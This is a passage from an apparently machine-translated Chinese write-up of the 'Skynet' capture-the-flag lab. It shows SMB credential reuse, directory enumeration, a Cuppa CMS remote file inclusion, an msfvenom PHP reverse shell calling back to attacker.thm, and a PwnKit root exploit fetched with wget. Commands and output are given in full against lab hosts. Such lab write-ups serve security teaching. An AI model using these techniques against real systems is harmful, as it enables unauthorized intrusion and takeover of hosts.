ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">来自<code class="fe nh ni nj nk b">serenakogan@skynet</code>的邮件似乎不包含任何有用的信息。第三封电子邮件发自<code class="fe nh ni nj nk b">skynet@skynet</code>，主题为“重置密码”，内容如下:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="0504" class="nl lr iu nk b gz oc od l oe of">We have changed your smb password after system malfunction.<br/>Password: )s{A&amp;2Z=F^n_E.B`</span></pre><p id="540b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在我有了用户名和密码组合的第二部分，这有可能让我进入Dyson拥有的一个SMB帐户。</p><p id="d839" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我现在将尝试使用Miles Dyson的名字和提供的密码登录Samba。我运行<a class="ae kz" href="https://www.metasploit.com/" rel="noopener ugc nofollow" target="_blank"> Metasploit (n.d.) </a>，并使用其<code class="fe nh ni nj nk b">smb_login</code>模块(<a class="ae kz" href="https://www.infosecmatter.com/metasploit-module-library/?mm=auxiliary/scanner/smb/smb_login" rel="noopener ugc nofollow" target="_blank"> InfoSec Matter，n.d. </a>)计算出戴森的SMB帐户的用户名:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="ce8a" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~]<br/>└─$ sudo msfconsole</strong><br/>[sudo] password for dna: </span><span id="bcca" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span><span id="ec13" class="nl lr iu nk b gz og od l oe of"><strong class="nk iv">msf6 &gt; use auxiliary/scanner/smb/smb_login</strong><br/><strong class="nk iv">msf6 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS skynet.thm</strong><br/>RHOSTS =&gt; skynet.thm<br/><strong class="nk iv">msf6 auxiliary(scanner/smb/smb_login) &gt; set RPORT 445</strong><br/>RPORT =&gt; 445<br/><strong class="nk iv">msf6 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE ~/skynet/username_file</strong><br/>USER_FILE =&gt; ~/skynet/username_list<br/><strong class="nk iv">msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBPASS )s{A&amp;2Z=F^n_E.B`</strong><br/>SMBPASS =&gt; )s{A&amp;2Z=F^n_E.B`<br/><strong class="nk iv">msf6 auxiliary(scanner/smb/smb_login) &gt; run</strong></span><span id="5cc5" class="nl lr iu nk b gz og od l oe of">[*] skynet.thm:445 [...] Starting SMB login bruteforce<br/>[+] skynet.thm:445 [...] <strong class="nk iv">Success</strong>: '.\miles:)s{A&amp;2Z=F^n_E.B`'<br/>[!] skynet.thm:445 [...] No active DB -- Credential data will not be saved!<br/>[+] skynet.thm:445 [...] <strong class="nk iv">Success</strong>: '.\dyson:)s{A&amp;2Z=F^n_E.B`'<br/>[+] skynet.thm:445 [...] <strong class="nk iv">Success</strong>: '.\m.dyson:)s{A&amp;2Z=F^n_E.B`'</span><span id="acda" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span><span id="0b4f" class="nl lr iu nk b gz og od l oe of">[+] skynet.thm:445 [...] <strong class="nk iv">Success</strong>: '.\milesd:)s{A&amp;2Z=F^n_E.B`'<br/>[+] skynet.thm:445 [...] <strong class="nk iv">Success</strong>: '.\milesdyson:)s{A&amp;2Z=F^n_E.B`'<br/>[*] skynet.thm:445   ... Scanned 1 of 1 hosts (100% complete)<br/>[*] Auxiliary module execution completed</span></pre><p id="aad9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在<code class="fe nh ni nj nk b">smb_login</code>模块报告了每个用户名和密码组合的“成功”;这告诉我，它似乎不能正常工作。这可能是因为我的错误，但是我决定用相当短的<code class="fe nh ni nj nk b">username_file</code>和发现的密码手动测试登录组合。</p><p id="2272" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">回想一下，在Samba服务上有一个名为<code class="fe nh ni nj nk b">milesdyson</code>(表2)的共享，所以我将尝试使用<code class="fe nh ni nj nk b">smbclient</code>来访问挂载。经过一段时间的反复试验，我得以进入milesdyson的SMB登录:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="03c7" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ smbclient //skynet.thm/milesdyson -U milesdyson </strong><br/>Enter WORKGROUP\milesdyson's password: <strong class="nk iv">)s{A&amp;2Z=F^n_E.B`</strong><br/>Try "help" to get a list of possible commands.<br/><strong class="nk iv">smb: \&gt;</strong></span></pre><p id="3dac" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我开始下载根目录:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="a069" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">smb: \&gt; pwd</strong><br/>Current directory is \\skynet.thm\milesdyson\<br/><strong class="nk iv">smb: \&gt; ls</strong><br/>  .                                   D        0  Tue Sep 17 05:05:47 2019<br/>  ..                                  D        0  Tue Sep 17 23:51:03 2019<br/>  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019<br/>  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019<br/>  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019<br/>  notes                               D        0  Tue Sep 17 05:18:40 2019<br/>  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019<br/>  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019</span><span id="7d70" class="nl lr iu nk b gz og od l oe of">9204224 blocks of size 1024. 5831504 blocks available<br/><strong class="nk iv">smb: \&gt; get Improving Deep Neural Networks.pdf</strong><br/>NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Improving<br/><strong class="nk iv">smb: \&gt; get "Improving Deep Neural Networks.pdf"</strong><br/>getting file \Improving Deep Neural Networks.pdf of size 5743095 as Improving Deep Neural Networks.pdf (528.4 KiloBytes/sec) (average 528.4 KiloBytes/sec)</span><span id="8a25" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span><span id="2a7b" class="nl lr iu nk b gz og od l oe of"><strong class="nk iv">smb: \&gt;</strong></span></pre><p id="2063" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我开始下载notes目录。在列出其中的文件数量后，我需要找到一种方法来加快这个过程。我是通过递归和<a class="ae kz" href="https://superuser.com/a/856640" rel="noopener ugc nofollow" target="_blank">“弗兰克·托马斯”和“伽罗华”(2014) </a>建议的稍微修改的技术做到这一点的:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="282a" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">smb: \notes\&gt; recurse ON</strong><br/><strong class="nk iv">smb: \notes\&gt; mget *</strong><br/>Get file 3.01 Search.md? <strong class="nk iv">Y</strong><br/>getting file \notes\3.01 Search.md of size 65601 as 3.01 Search.md (103.5 KiloBytes/sec) (average 1606.4 KiloBytes/sec)<br/>Get file 4.01 Agent-Based Models.md? <strong class="nk iv">Y</strong><br/>getting file \notes\4.01 Agent-Based Models.md of size 5683 as 4.01 Agent-Based Models.md (8.1 KiloBytes/sec) (average 1568.6 KiloBytes/sec)</span><span id="6490" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span><span id="7986" class="nl lr iu nk b gz og od l oe of">Get file 3.04 Filtering.md? <strong class="nk iv">Y</strong><br/>getting file \notes\3.04 Filtering.md of size 13360 as 3.04 Filtering.md (14.7 KiloBytes/sec) (average 887.1 KiloBytes/sec)<br/>Get file 1.00 Foundations.md? <strong class="nk iv">Y</strong><br/>getting file \notes\1.00 Foundations.md of size 22 as 1.00 Foundations.md (0.0 KiloBytes/sec) (average 879.0 KiloBytes/sec)<br/><strong class="nk iv">smb: \notes\&gt;</strong></span></pre><p id="9d56" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我忘了删除带有<code class="fe nh ni nj nk b">prompt OFF</code>的提示——尽管希望下次我会记得这么做😉</p><p id="154f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">大多数下载的文件看起来像数据科学相关的文档。但是，有一个名为<code class="fe nh ni nj nk b">important.txt</code>的文件透露了一个非常有趣的信息:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="25a6" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ cat important.txt</strong></span><span id="bdb3" class="nl lr iu nk b gz og od l oe of">1. Add features to beta CMS /45kra24zxs28v3yd<br/>2. Work on T-800 Model 101 blueprints<br/>3. Spend more time with my wife  &lt;-- lol</span></pre><p id="2796" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">web服务器上好像有个子目录叫<code class="fe nh ni nj nk b">/45kra24zxs28v3yd</code>。我导航到它，确实有一些东西在那个子目录上运行(图13):</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj pf"><img src="../Images/aefc72fa59d9459e255138725cb325f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0ZZXCqDpKi0lJsg57edXfg.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图13</figcaption></figure><p id="5ef7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后我查看了网页上的HTML源代码，看看是否有什么有趣的链接或评论:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="44d9" class="nl lr iu nk b gz oc od l oe of">&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;style&gt;<br/>body {<br/>  color: white;<br/>}<br/>&lt;/style&gt;<br/>&lt;/head&gt;<br/>&lt;body bgcolor="black"&gt;<br/>&lt;center&gt;&lt;br /&gt;<br/>&lt;img src='miles.jpg'&gt;<br/>&lt;h2&gt;Miles Dyson Personal Page&lt;/h2&gt;&lt;p&gt;Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,&lt;br /&gt; a computer A.I. intended to control electronically linked weapons and defend the United States.&lt;/p&gt;<br/>&lt;/center&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</span></pre><p id="ca89" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">可悲的是，HTML源代码只有要在浏览器中呈现的内容的标记。我的下一个计划是对子目录运行<em class="ky"> gobuster </em>工具:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="cc29" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ gobuster dir -u http://skynet.thm/45kra24zxs28v3yd -w ./wordlist.txt -x php,php5,htm,html -t 45</strong><br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (<a class="ae kz" href="http://twitter.com/TheColonial" rel="noopener ugc nofollow" target="_blank">@TheColonial</a>) &amp; Christian Mehlmauer (<a class="ae kz" href="http://twitter.com/firefart" rel="noopener ugc nofollow" target="_blank">@firefart</a>)<br/>===============================================================<br/>[+] Url:                     http://skynet.thm/45kra24zxs28v3yd<br/>[+] Method:                  GET<br/>[+] Threads:                 45<br/>[+] Wordlist:                ./wordlist.txt<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.1.0<br/>[+] Extensions:              php,php5,htm,html<br/>[+] Timeout:                 10s<br/>===============================================================<br/>Starting gobuster in directory enumeration mode<br/>===============================================================<br/>/index.html           (Status: 200) [Size: 418]<br/>/administrator        (Status: 301) [Size: 333] [--&gt; http://skynet.thm/45kra24zxs28v3yd/administrator/]<br/>Progress: 236520 / 1038220 (22.78%)</span><span id="b249" class="nl lr iu nk b gz og od l oe of">[... snip ...]<br/>                                                                                                       <br/>===============================================================<br/>Finished<br/>===============================================================<br/>                                                                                                             <br/><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$</strong></span></pre><p id="5a31" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这个子目录中透露了一个有趣的<code class="fe nh ni nj nk b">/administrator</code>子目录。图14显示了查看后的结果:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj pg"><img src="../Images/c0e5b2ae0bcf871166404ca6efbb29a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Foz6AwM0Ci7Cxz1WUq93CQ.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图14</figcaption></figure><p id="549d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">它运行的是<a class="ae kz" href="https://www.cuppacms.com/" rel="noopener ugc nofollow" target="_blank">Cuppa CMS(n . d .)</a>——根据其名称猜测，这是一个内容管理系统。粗略的研究表明，这款软件容易受到由<a class="ae kz" href="https://www.exploit-db.com/exploits/25971" rel="noopener ugc nofollow" target="_blank">“CWH地下”(2013) </a>设计的<em class="ky">远程文件包含</em>漏洞的攻击。远程文件包含将允许我在托管CMS软件的以下子目录中注入一个PHP脚本:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="90e1" class="nl lr iu nk b gz oc od l oe of">/alerts/alertConfigField.php?urlConfig=</span></pre><p id="2184" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">具体来说，<code class="fe nh ni nj nk b">urlConfig</code>是一个易受攻击的参数，我可以通过它注入恶意的PHP脚本。为了测试这个假设，我编写了一个简单的PHP脚本，将“Hello World”打印到浏览器中:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="6975" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ cat test.php</strong><br/>&lt;?php<br/>echo "Hello World!";<br/>?&gt;</span></pre><p id="c39f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后我将运行一个简单的Python驱动的HTTP服务器，使用它的<code class="fe nh ni nj nk b">http.server</code>模块(<a class="ae kz" href="https://docs.python.org/3/library/http.server.html" rel="noopener ugc nofollow" target="_blank"> Python 3.10.8文档，n.d. </a>):</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="802f" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ python3 -m http.server 8000</strong><br/>Serving HTTP on 0.0.0.0 port 8000 (<a class="ae kz" href="http://0.0.0.0:8000/" rel="noopener ugc nofollow" target="_blank">http://0.0.0.0:8000/</a>) ...<br/>skynet.thm - - [redacted] "GET /test.php HTTP/1.0" 200 -</span></pre><p id="2470" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在，我将在我的网络浏览器上向以下URL发出一个<code class="fe nh ni nj nk b">GET</code>请求:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="2d51" class="nl lr iu nk b gz oc od l oe of">http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://attacker.thm:8000/test.php</span></pre><p id="a66c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">图15描述了<code class="fe nh ni nj nk b">GET</code>请求的结果:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div class="gi gj ph"><img src="../Images/8005e1011d42e7bbffe9a4e05a845907.png" data-original-src="https://miro.medium.com/v2/resize:fit:1154/format:webp/1*xIFnbkKyLiXU6Fs5i39-vw.png"/></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图15</figcaption></figure><p id="7fde" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这表明，至少在我的特定情况下，我可以在目标系统上执行PHP代码。我将使用<code class="fe nh ni nj nk b">msfvenom</code>生成一个PHP脚本来启动一个反向的meter preter shell(<a class="ae kz" href="https://www.infosecmatter.com/metasploit-module-library/?mm=payload/php/meterpreter/reverse_tcp" rel="noopener ugc nofollow" target="_blank">InfoSec Matter，n.d.-b </a>):</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="cd17" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.thm LPORT=4444 -f raw -o reverse.php</strong><br/>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br/>[-] No arch selected, selecting arch: php from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 1111 bytes<br/>Saved as: reverse.php</span></pre><p id="0bb4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我需要对PHP脚本做一个小的修改来使它执行，即从脚本中删除前两个字符(<code class="fe nh ni nj nk b">/*</code>)(以粗体突出显示):</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="c922" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">/*</strong>&lt;?php /**/ error_reporting(0); $ip = 'attacker.thm'; $port = 4444; if (($f = 'stream_ [... snip ...]</span></pre><p id="5fd1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">删除此内容后，我将配置Metasploit来接收反向shell:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="cb38" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~]<br/>└─$ sudo msfconsole      </strong>          <br/>[sudo] password for dna:</span><span id="70d9" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span><span id="6ff7" class="nl lr iu nk b gz og od l oe of"><strong class="nk iv">msf6 &gt; use exploit/multi/handler</strong><br/>[*] Using configured payload generic/shell_reverse_tcp<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</strong><br/>PAYLOAD =&gt; php/meterpreter/reverse_tcp<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; set LHOST attacker.thm</strong><br/>LHOST =&gt; attacker.thm<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; set LPORT 4444</strong><br/>LPORT =&gt; 4444<br/><strong class="nk iv">msf6 exploit(multi/handler) &gt; exploit</strong></span><span id="0e4d" class="nl lr iu nk b gz og od l oe of">[*] Started reverse TCP handler on attacker.thm:4444</span></pre><p id="c8e8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在我需要做的就是向下面的地址发送一个GET请求来获得反向shell:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="6162" class="nl lr iu nk b gz oc od l oe of">http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://attacker.thm:8000/reverse.php</span></pre><p id="24b7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit得到了相反的shell:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="6b4c" class="nl lr iu nk b gz oc od l oe of">[*] Started reverse TCP handler on attacker.thm:4444 <br/>[*] Sending stage (39860 bytes) to skynet.thm<br/>[*] Meterpreter session 1 opened (attacker.thm:4444 -&gt; skynet.thm:54526 ) at [redacted] -0400</span><span id="c448" class="nl lr iu nk b gz og od l oe of"><strong class="nk iv">meterpreter &gt;</strong></span></pre><p id="fcb7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我发现这是一个Linux系统。现在可以转储标志了:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="e632" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">meterpreter &gt; shell</strong><br/>Process 2003 created.<br/>Channel 1 created.<br/><strong class="nk iv">$ find / -name *user.txt* -type f -print 2&gt;/dev/null; echo "Done!"</strong><br/>/home/milesdyson/user.txt<br/>Done!<br/><strong class="nk iv">$ cat /home/milesdyson/user.txt</strong><br/>[redacted]</span></pre><p id="96d9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我现在可以进行权限升级了。</p><h2 id="c297" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">利用后:权限提升</h2><p id="8e0c" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我将使用<em class="ky">LinEnum</em>(<a class="ae kz" href="https://github.com/rebootuser/LinEnum" rel="noopener ugc nofollow" target="_blank">“rebootser”，n.d. </a>)和<em class="ky"> linPEAS </em> ( <a class="ae kz" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank"> Polop，n.d. </a>)找到一个漏洞向量，它将允许我获得系统的根权限。将它们上传到目标机器后，我运行它们并分析它们的输出。linPEAS给出了一些有趣的输出:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="b7f5" class="nl lr iu nk b gz oc od l oe of">[... snip ...]</span><span id="8284" class="nl lr iu nk b gz og od l oe of">[+] [CVE-2021-4034] PwnKit</span><span id="f237" class="nl lr iu nk b gz og od l oe of">Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<br/>   Exposure: probable<br/>   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro<br/>   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main</span><span id="1a83" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span></pre><p id="ef68" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我对<em class="ky"> PwnKit </em> ( <a class="ae kz" href="https://github.com/berdav/CVE-2021-4034/" rel="noopener ugc nofollow" target="_blank"> Berardi，n.d. </a>)有经验，所以决定尝试利用这个漏洞。我把它下载到了目标系统上，并获得了系统的超级用户权限:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="d02f" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">$ wget http://attacker.thm:8000/pwnkit.zip</strong><br/>--[redacted]--  http://attacker.thm:8000/pwnkit.zip<br/>Connecting to attacker.thm:8000... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 6457 (6.3K) [application/zip]<br/>Saving to: 'pwnkit.zip'</span><span id="b38d" class="nl lr iu nk b gz og od l oe of">0K ......                                                100% 2.42M=0.003s</span><span id="5b09" class="nl lr iu nk b gz og od l oe of">[redacted] (2.42 MB/s) - 'pwnkit.zip' saved [6457/6457]</span><span id="2327" class="nl lr iu nk b gz og od l oe of"><strong class="nk iv">$ unzip pwnkit.zip</strong><br/>Archive:  pwnkit.zip<br/>55d60e381ef90463ed35f47af44bf7e2fbc150d4<br/>   creating: CVE-2021-4034-main/<br/>  inflating: CVE-2021-4034-main/.gitignore  <br/>  inflating: CVE-2021-4034-main/LICENSE  <br/>  inflating: CVE-2021-4034-main/Makefile  <br/>  inflating: CVE-2021-4034-main/README.md  <br/>  inflating: CVE-2021-4034-main/cve-2021-4034.c  <br/>  inflating: CVE-2021-4034-main/cve-2021-4034.sh  <br/>   creating: CVE-2021-4034-main/dry-run/<br/>  inflating: CVE-2021-4034-main/dry-run/Makefile  <br/>  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  <br/>  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  <br/>  inflating: CVE-2021-4034-main/pwnkit.c  <br/><strong class="nk iv">$ cd CVE-2021-4034-main/</strong><br/><strong class="nk iv">$ pwd</strong><br/>/var/www/html/CVE-2021-4034-main<br/><strong class="nk iv">$ make</strong><br/>cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br/>cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br/>echo "module UTF-8// PWNKIT// pwnkit 1" &gt; gconv-modules<br/>mkdir -p GCONV_PATH=.<br/>cp -f /bin/true GCONV_PATH=./pwnkit.so:.<br/><strong class="nk iv">$ id</strong><br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/><strong class="nk iv">$ ls</strong><br/>GCONV_PATH=.<br/>LICENSE<br/>Makefile<br/>README.md<br/>cve-2021-4034<br/>cve-2021-4034.c<br/>cve-2021-4034.sh<br/>dry-run<br/>gconv-modules<br/>pwnkit.c<br/>pwnkit.so<br/><strong class="nk iv">$ ./cve-2021-4034</strong><br/><strong class="nk iv"># id</strong><br/>uid=0(root) gid=0(root) groups=0(root),33(www-data)</span></pre><p id="34be" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我现在可以得到根标志了:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="68f2" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv"># cd /root</strong><br/><strong class="nk iv"># ls</strong><br/>root.txt<br/><strong class="nk iv"># cat root.txt</strong><br/>[redacted]</span></pre><p id="67be" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="9899" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">结论</h1><p id="0822" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">这个实验室显示出比预期的更难，既乏味又费智力——至少对我来说是这样！当涉及到侦察时，它真的“突破了界限”:进攻型安全工程师被期望通过每一个角落和缝隙进行检查，并吸收任何信息以获得对系统的进一步访问。</p><p id="041d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">甚至像电子邮件线程和密码重复使用这样的小事也可以帮助攻击者获得对系统的更多访问权限。过去的安全漏洞证明了这一点HBGary黑客事件就是一个非常臭名昭著的例子(<a class="ae kz" href="https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/" rel="noopener ugc nofollow" target="_blank"> Ars Staff，2011 </a>)。</p><p id="cc2d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，就像一部好的戏剧或喜剧一样，事情并没有像预期的那样发展。我原以为我会利用SquirrelMail web应用程序上的一个bug来获得一个反向shell，但我最终还是阅读了“Miles Dyson的”邮件，以获得更多关于利用目标系统的信息。所有黑客或安全工程师都应该实践将较小的漏洞链接起来以实现目标(在我的例子中是一个反向shell)。HBGary黑客再次证明了这一策略的有效性。</p><h2 id="af03" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">插头</h2><p id="558c" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">Mira Lazine ( <a class="ae kz" href="https://twitter.com/MiraLazine" rel="noopener ugc nofollow" target="_blank"> Twitter </a>，<a class="ae kz" href="https://medium.com/@MiraLazine" rel="noopener"> Medium </a>)是一位优秀的年轻女性，她和她的同事需要帮助解决他们的财务状况。我呼吁读者尽可能向他们捐款:</p><ul class=""><li id="60a1" class="mo mp iu jt b ju jv jy jz kc ol kg om kk on ko oo mw mx my bi translated">米拉拉齐奥:<a class="ae kz" href="https://cash.app/$MiraLazine" rel="noopener ugc nofollow" target="_blank">https://cash.app/$MiraLazine</a></li><li id="aca1" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">《性别贪婪》:<a class="ae kz" href="https://moneyyy.me/$gendergreed" rel="noopener ugc nofollow" target="_blank">https://moneyyy.me/$gendergreed</a></li><li id="2c10" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">https://cash.app/$corrigantol的科里甘·托尔伯特</li><li id="dfc6" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">" mem who ":<a class="ae kz" href="https://moneyyy.me/$memwho" rel="noopener ugc nofollow" target="_blank">https://moneyyy.me/$memwho</a></li><li 